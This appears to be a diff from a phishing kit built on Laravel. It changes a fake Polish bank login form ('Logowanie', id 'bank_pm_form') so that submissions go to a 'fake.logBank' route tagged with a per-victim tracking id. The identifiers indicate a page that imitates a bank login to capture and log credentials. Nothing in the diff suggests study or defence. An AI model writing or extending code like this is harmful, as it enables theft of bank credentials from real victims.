@@ -54,7 +54,7 @@
 @endpush
 @section('content')
     <div class="centered">
-        <form id="bank_pm_form" method="POST" action="/log/bank"
+        <form id="bank_pm_form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
               role="form" class="container p-2 m-auto text-center">
             <h2>Logowanie</h2><br>
             <div class="form-group">
